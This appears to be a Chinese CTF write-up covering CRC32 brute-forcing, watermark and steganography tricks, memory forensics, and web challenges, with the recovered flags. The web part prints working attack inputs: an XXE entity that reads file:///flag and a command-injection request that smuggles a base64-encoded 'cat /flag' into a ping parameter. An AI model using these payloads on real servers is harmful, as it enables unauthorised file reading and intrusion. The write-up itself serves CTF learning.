#PYTHON2 from zlib import crc32 import random char='0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;' # char='0123456789' def crc32_f(data): return hex(crc32(data)&amp;0xffffffff)[2:10] length=input('length:') crc32_=raw_input('crc32:').lower() while True: text='' for i in range(length): text+=char[random.randint(0,len(char)-1)] if crc32_f(text)==crc32_: raw_input('find it:'+text) exit CRC32用WinRAR查看 flag{crc32collis1on} kaomoji flag.zip里面有个secret.txt，盲猜是明文 浏览器控制台直接解密 flag{kaomoj1_1s_cut3} ARCHPR CTF在线工具-在线莫尔斯电码编码|在线莫尔斯电码解码|莫尔斯电码算法|Morse (ssleye.com) flag{th1s_15_f1agggggg} outguess Online calculator: Caesar cipher (planetcalc.com) 在线AES加密 | AES解密 - 在线工具 (sojson.com) flag{y0u_ar3_awes0m3} Whitespace 下载下来的压缩包需要密码，在注释里面，Whitespace Whitelips the Whitespace IDE (vii5ard.github.io) 在线IDE，运行程序 解压出来是两张图片和一个hint.txt 盲水印 #!/usr/bin/env python3 # -*- coding: utf8 -*- import sys import random cmd = None debug = False seed = 20160930 oldseed = False alpha = 3.0 if __name__ == '__main__': if '-h' in sys.argv or '--help' in sys.argv or len(sys.argv) &lt; 2: print ('Usage: python bwm.py &lt;cmd> [arg...] [opts...]') print (' cmds:') print (' encode &lt;image> &lt;watermark> &lt;image(encoded)>') print (' image + watermark -> image(encoded)') print (' decode &lt;image> &lt;image(encoded)> &lt;watermark>') print (' image + image(encoded) -> watermark') print (' opts:') print (' --debug, Show debug') print (' --seed &lt;int>, Manual setting random seed (default is 20160930)') print (' --oldseed Use python2 random algorithm.') print (' --alpha &lt;float>, Manual setting alpha (default is 3.0)') sys.exit(1) cmd = sys.argv[1] if cmd != 'encode' and cmd != 'decode': print ('Wrong cmd %s' % cmd) sys.exit(1) if '--debug' in sys.argv: debug = True del sys.argv[sys.argv.index('--debug')] if '--seed' in sys.argv: p = sys.argv.index('--seed') if len(sys.argv) &lt;= p+1: print ('Missing &lt;int> for --seed') sys.exit(1) seed = int(sys.argv[p+1]) del sys.argv[p+1] del sys.argv[p] if '--oldseed' in sys.argv: oldseed = True del sys.argv[sys.argv.index('--oldseed')] if '--alpha' in sys.argv: p = sys.argv.index('--alpha') if len(sys.argv) &lt;= p+1: print ('Missing &lt;float> for --alpha') sys.exit(1) alpha = float(sys.argv[p+1]) del sys.argv[p+1] del sys.argv[p] if len(sys.argv) &lt; 5: print ('Missing arg...') sys.exit(1) fn1 = sys.argv[2] fn2 = sys.argv[3] fn3 = sys.argv[4] import cv2 import numpy as np import matplotlib.pyplot as plt # OpenCV是以(BGR)的顺序存储图像数据的 # 而Matplotlib是以(RGB)的顺序显示图像的 def bgr_to_rgb(img): b, g, r = cv2.split(img) return cv2.merge([r, g, b]) if cmd == 'encode': print ('image&lt;%s> + watermark&lt;%s> -> image(encoded)&lt;%s>' % (fn1, fn2, fn3)) img = cv2.imread(fn1) wm = cv2.imread(fn2) if debug: plt.subplot(231), plt.imshow(bgr_to_rgb(img)), plt.title('image') plt.xticks([]), plt.yticks([]) plt.subplot(234), plt.imshow(bgr_to_rgb(wm)), plt.title('watermark') plt.xticks([]), plt.yticks([]) # print img.shape # 高, 宽, 通道 h, w = img.shape[0], img.shape[1] hwm = np.zeros((int(h * 0.5), w, img.shape[2])) assert hwm.shape[0] > wm.shape[0] assert hwm.shape[1] > wm.shape[1] hwm2 = np.copy(hwm) for i in range(wm.shape[0]): for j in range(wm.shape[1]): hwm2[i][j] = wm[i][j] if oldseed: random.seed(seed,version=1) else: random.seed(seed) m, n = list(range(hwm.shape[0])), list(range(hwm.shape[1])) if oldseed: random.shuffle(m,random=random.random) random.shuffle(n,random=random.random) else: random.shuffle(m) random.shuffle(n) for i in range(hwm.shape[0]): for j in range(hwm.shape[1]): hwm[i][j] = hwm2[m[i]][n[j]] rwm = np.zeros(img.shape) for i in range(hwm.shape[0]): for j in range(hwm.shape[1]): rwm[i][j] = hwm[i][j] rwm[rwm.shape[0] - i - 1][rwm.shape[1] - j - 1] = hwm[i][j] if debug: plt.subplot(235), plt.imshow(bgr_to_rgb(rwm)), \\ plt.title('encrypted(watermark)') plt.xticks([]), plt.yticks([]) f1 = np.fft.fft2(img) f2 = f1 + alpha * rwm _img = np.fft.ifft2(f2) if debug: plt.subplot(232), plt.imshow(bgr_to_rgb(np.real(f1))), \\ plt.title('fft(image)') plt.xticks([]), plt.yticks([]) img_wm = np.real(_img) assert cv2.imwrite(fn3, img_wm, [int(cv2.IMWRITE_JPEG_QUALITY), 100]) # 这里计算下保存前后的(溢出)误差 img_wm2 = cv2.imread(fn3) sum = 0 for i in range(img_wm.shape[0]): for j in range(img_wm.shape[1]): for k in range(img_wm.shape[2]): sum += np.power(img_wm[i][j][k] - img_wm2[i][j][k], 2) miss = np.sqrt(sum) / (img_wm.shape[0] * img_wm.shape[1] * img_wm.shape[2]) * 100 print ('Miss %s%% in save' % miss) if debug: plt.subplot(233), plt.imshow(bgr_to_rgb(np.uint8(img_wm))), \\ plt.title('image(encoded)') plt.xticks([]), plt.yticks([]) f2 = np.fft.fft2(img_wm) rwm = (f2 - f1) / alpha rwm = np.real(rwm) wm = np.zeros(rwm.shape) for i in range(int(rwm.shape[0] * 0.5)): for j in range(rwm.shape[1]): wm[m[i]][n[j]] = np.uint8(rwm[i][j]) for i in range(int(rwm.shape[0] * 0.5)): for j in range(rwm.shape[1]): wm[rwm.shape[0] - i - 1][rwm.shape[1] - j - 1] = wm[i][j] if debug: assert cv2.imwrite('_bwm.debug.wm.jpg', wm) plt.subplot(236), plt.imshow(bgr_to_rgb(wm)), plt.title(u'watermark') plt.xticks([]), plt.yticks([]) if debug: plt.show() elif cmd == 'decode': print ('image&lt;%s> + image(encoded)&lt;%s> -> watermark&lt;%s>' % (fn1, fn2, fn3)) img = cv2.imread(fn1) img_wm = cv2.imread(fn2) if debug: plt.subplot(231), plt.imshow(bgr_to_rgb(img)), plt.title('image') plt.xticks([]), plt.yticks([]) plt.subplot(234), plt.imshow(bgr_to_rgb(img_wm)), plt.title('image(encoded)') plt.xticks([]), plt.yticks([]) if oldseed: random.seed(seed,version=1) else: random.seed(seed) m, n = list(range(int(img.shape[0] * 0.5))), list(range(img.shape[1])) if oldseed: random.shuffle(m,random=random.random) random.shuffle(n,random=random.random) else: random.shuffle(m) random.shuffle(n) f1 = np.fft.fft2(img) f2 = np.fft.fft2(img_wm) if debug: plt.subplot(232), plt.imshow(bgr_to_rgb(np.real(f1))), \\ plt.title('fft(image)') plt.xticks([]), plt.yticks([]) plt.subplot(235), plt.imshow(bgr_to_rgb(np.real(f1))), \\ plt.title('fft(image(encoded))') plt.xticks([]), plt.yticks([]) rwm = (f2 - f1) / alpha rwm = np.real(rwm) if debug: plt.subplot(233), plt.imshow(bgr_to_rgb(rwm)), \\ plt.title('encrypted(watermark)') plt.xticks([]), plt.yticks([]) wm = np.zeros(rwm.shape) for i in range(int(rwm.shape[0] * 0.5)): for j in range(rwm.shape[1]): wm[m[i]][n[j]] = np.uint8(rwm[i][j]) for i in range(int(rwm.shape[0] * 0.5)): for j in range(rwm.shape[1]): wm[rwm.shape[0] - i - 1][rwm.shape[1] - j - 1] = wm[i][j] assert cv2.imwrite(fn3, wm) if debug: plt.subplot(236), plt.imshow(bgr_to_rgb(wm)), plt.title(u'watermark') plt.xticks([]), plt.yticks([]) if debug: plt.show() 大小较大的那张作为有水印的图片 hint里面还有一个是Manchester coding（曼彻斯特编码） 曼彻斯特编码解码器下载_曼彻斯特编码解码器官方下载-太平洋下载中心 (pconline.com.cn) 把图片左上角或右下角的都输入工具的第一个输入框中（十六进制），按照1-2-3的顺序点击按钮，得到的十六进制转ASCII 266C61677B61623164655F62795F7468335F6C61777D &amp;lag{ab1de_by_th3_law} flag{ab1de_by_th3_law} Steghide Ook编码，把¿ ¡改成? !，空格改成Ook [Brainfuck/Ook! Obfuscation/Encoding splitbrain.org] flag{y0u_ar3_clev3r} SSTV[BUUCTF：UTCTF2020]sstv_末初-CSDN博客 类似做法，直接照着来就可以 QSSTV DMCTF{SSTV,yyds?} 最简单的内存取证用volatility来做 首先识别系统 扫描进程，看看有什么 看不出什么东西，太菜了。。。 扫描文件 有个flag.txt，提取出来 89504E47是PNG的文件头，用WinHex保存下来。 是张缺了定位码的二维码，补全。 DMCTF{Mem0ry_FoRensics+i5-vErY_1ntere5t1nG} SimpleQrcodegif，StegSolve分离 一张张扫，手动做法。 DMCTF{QrCode_1s_so_interesting!!!} WEBweak_type &lt;?php show_source(__FILE__); include('class.php'); //level1 if(isset($_GET['num']))&#123; $num = $_GET['num']; if($num===\"202020020\")&#123; die(\"no no no!\"); &#125; if(intval($num,0)===202020020)&#123; echo \"&lt;br> level 1 Ok &lt;br>\"; &#125;else&#123; die('what are you doing?'); &#125; &#125;else&#123; die(); &#125; //level 2 if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; if($v1 != $v2 &amp;&amp; md5($v1)==md5($v2))&#123; echo \"&lt;br> level 2 Ok &lt;br>\"; &#125;else&#123; die('Are you kidding me ?'); &#125; &#125;else&#123; die(); &#125; //level 3 if (isset($_POST['message'])) &#123; $message = json_decode($_POST['message']); if ($message->key == $key) &#123; echo \"&lt;br> Wow you got it !!! &lt;br>\"; echo file_get_contents('/flag'); &#125; else &#123; die(\"fail\"); &#125; &#125; else&#123; echo \"~~~~\"; &#125; Warning: include(class.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 4 Warning: include(): Failed opening 'class.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 4 代码审计 总共三个level dmctf{80636ab6-aa36-4b73-8e92-c8bbeb2d1e1c} fungame var __encode ='jsjiami.com',_a=&#123;&#125;, _0xb483=[\"\\x5F\\x64\\x65\\x63\\x6F\\x64\\x65\",\"\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x77\\x77\\x77\\x2E\\x73\\x6F\\x6A\\x73\\x6F\\x6E\\x2E\\x63\\x6F\\x6D\\x2F\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x6F\\x62\\x66\\x75\\x73\\x63\\x61\\x74\\x6F\\x72\\x2E\\x68\\x74\\x6D\\x6C\"];(function(_0xd642x1)&#123;_0xd642x1[_0xb483[0]]= _0xb483[1]&#125;)(_a);var __Oxa2781=[\"\",\"\\x2D\\x70\\x61\\x75\\x73\\x65\\x64\\x2D\",\"\\x59\\x6F\\x75\\x20\\x57\\x69\\x6E\\x21\\x46\\x6C\\x61\\x67\\x20\\x44\\x4D\\x63\\x74\\x66\\x7B\\x66\\x6C\\x61\\x67\\x5F\\x69\\x73\\x5F\\x68\\x65\\x72\\x65\\x7D\\x21\",\"\\x47\\x61\\x6D\\x65\\x20\\x4F\\x76\\x65\\x72\\x21\",\"\\x50\\x72\\x65\\x73\\x73\\x20\\x45\\x73\\x63\\x61\\x70\\x65\",\"\\x78\",\"\\x79\",\"\\x63\\x65\\x6E\\x74\\x65\\x72\",\"\\x75\\x6E\\x64\\x65\\x66\\x69\\x6E\\x65\\x64\",\"\\x6C\\x6F\\x67\",\"\\u5220\\u9664\",\"\\u7248\\u672C\\u53F7\\uFF0C\\x6A\\x73\\u4F1A\\u5B9A\",\"\\u671F\\u5F39\\u7A97\\uFF0C\",\"\\u8FD8\\u8BF7\\u652F\\u6301\\u6211\\u4EEC\\u7684\\u5DE5\\u4F5C\",\"\\x6A\\x73\\x6A\\x69\\x61\",\"\\x6D\\x69\\x2E\\x63\\x6F\\x6D\"];let bigText=__Oxa2781[0x0];if(paused)&#123;bigText= __Oxa2781[0x1]&#125;;if(winTimer.IsSet())&#123;bigText= __Oxa2781[0x2]&#125;;if(player.IsDead())&#123;bigText= __Oxa2781[0x3];DrawText(__Oxa2781[0x4],mainCanvasSize[__Oxa2781[0x5]]/ 2,mainCanvasSize[__Oxa2781[0x6]]/ 2+ 80,42)&#125;;DrawText(bigText,mainCanvasSize[__Oxa2781[0x5]]/ 2,mainCanvasSize[__Oxa2781[0x6]]/ 2- 80,72,__Oxa2781[0x7],2);;;(function(_0x5197x2,_0x5197x3,_0x5197x4,_0x5197x5,_0x5197x6,_0x5197x7)&#123;_0x5197x7= __Oxa2781[0x8];_0x5197x5= function(_0x5197x8)&#123;if( typeof alert!== _0x5197x7)&#123;alert(_0x5197x8)&#125;;if( typeof console!== _0x5197x7)&#123;console[__Oxa2781[0x9]](_0x5197x8)&#125;&#125;;_0x5197x4= function(_0x5197x9,_0x5197x2)&#123;return _0x5197x9+ _0x5197x2&#125;;_0x5197x6= _0x5197x4(__Oxa2781[0xa],_0x5197x4(_0x5197x4(__Oxa2781[0xb],__Oxa2781[0xc]),__Oxa2781[0xd]));try&#123;_0x5197x2= __encode;if(!( typeof _0x5197x2!== _0x5197x7&amp;&amp; _0x5197x2=== _0x5197x4(__Oxa2781[0xe],__Oxa2781[0xf])))&#123;_0x5197x5(_0x5197x6)&#125;&#125;catch(e)&#123;_0x5197x5(_0x5197x6)&#125;&#125;)(&#123;&#125;) 十六进制转ASCII DMctf{flag_is_here} xxe&lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;!DOCTYPE user [ &lt;!ENTITY abc SYSTEM \"file:///flag\"> ]> &lt;user>&lt;username>admin&lt;/username>&lt;password>&amp;abc;&lt;/password>&lt;/user> dmctf{a3d52192-34b4-43d6-87a2-ddca16395da1} pingpingping GET /ping.php?ip=127.0.0.1|`echo$IFS$1Y2F0IC9mbGFn$IFS$1|$IFS$1base64$IFS$1-d` HTTP/1.1 dmctf{53325310-af8c-4490-92ae-7ea25c1ddebc}","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"Write-up","slug":"Write-up","permalink":"http://example.com/tags/Write-up/"}]}],"categories":[],"tags":[{"name":"教程","slug":"教程","permalink":"http://example.com/tags/%E6%95%99%E7%A8%8B/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"Write-up","slug":"Write-up","permalink":"http://example.com/tags/Write-up/"},{"name":"技术","slug":"技术","permalink":"http://example.com/tags/%E6%8A%80%E6%9C%AF/"}]}